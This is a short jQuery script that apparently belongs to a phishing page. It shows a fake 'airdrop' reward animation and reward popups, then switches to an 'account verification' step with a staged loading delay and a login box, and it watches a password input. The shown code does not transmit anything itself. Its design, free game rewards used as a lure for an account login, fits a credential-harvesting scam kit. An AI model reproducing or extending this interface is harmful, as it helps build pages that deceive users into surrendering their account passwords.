function open_se3low_airdrop() {
	$('.se3low_airdrop').show()
	$('.once_confirmation').hide()
	setTimeout(function () {
	  $('.once_rewards').fadeIn('slow')
	  $('.se3low_airdrop').fadeOut()
	}, 6000)
  }
  function open_se3low_airdrops() {
	$('.se3low_airdrop').show()
	$('.many_confirmation').hide()
	setTimeout(function () {
	  $('.many_rewards').fadeIn('slow')
	  $('.se3low_airdrop').fadeOut()
	}, 6000)
  }
function open_account_login() {
    $('.account_verification').show();
	$('.itemReward_confirmation').hide();
	$('.once_rewards').hide();
	$('.many_rewards').hide();
	$('.many_confirmation').hide(); 	
	$('#load-login').show();    
    $('#box-login').hide();        
	setTimeout(function () {
	$('#load-login').hide();    
    $('#box-login').show();
      }, 2500);          	      		    
}
function show_kill1() {
	$('#kill1').fadeIn();     
	setTimeout(function () {
	$('#kill1').fadeOut(); 
      }, 2000);          	      		    
}
function show_kill2() {
	$('#kill2').fadeIn();     
	setTimeout(function () {
	$('#kill2').fadeOut(); 
      }, 2000);          	      		    
}
function show_kill3() {
	$('#kill3').fadeIn();     
	setTimeout(function () {
	$('#kill3').fadeOut(); 
      }, 2000);          	      		    
}
function show_kill4() {
	$('#kill4').fadeIn();     
	setTimeout(function () {
	$('#kill4').fadeOut(); 
      }, 2000);          	      		    
}
function show_kill5() {
	$('#kill5').fadeIn();     
	setTimeout(function () {
	$('#kill5').fadeOut(); 
      }, 2000);          	      		    
}
function show_kill6() {
	$('#kill6').fadeIn();     
	setTimeout(function () {
	$('#kill6').fadeOut(); 
      }, 2000);          	      		    
}
function open_otherReward_confirmation(ag) {
    var otherReward_confirmationImg = $(ag).attr("src");
	var otherReward_confirmationValue = $(ag).attr("value");
    $('.otherReward_confirmation').show();
    $('#myOtherReward_confirmationImg').attr('src',otherReward_confirmationImg);
	$('#otherReward_confirmationValue').html(otherReward_confirmationValue);
}
$(document).ready(function(){
    $('#selowpw-tw').keyup(function(){
        if($(this).val().length !=0){
            $('.onbutton').removeClass().addClass('twbutton'); 
        }
        else
        {
            $('.twbutton').removeClass().addClass('onbutton'); 
        }
    })
});
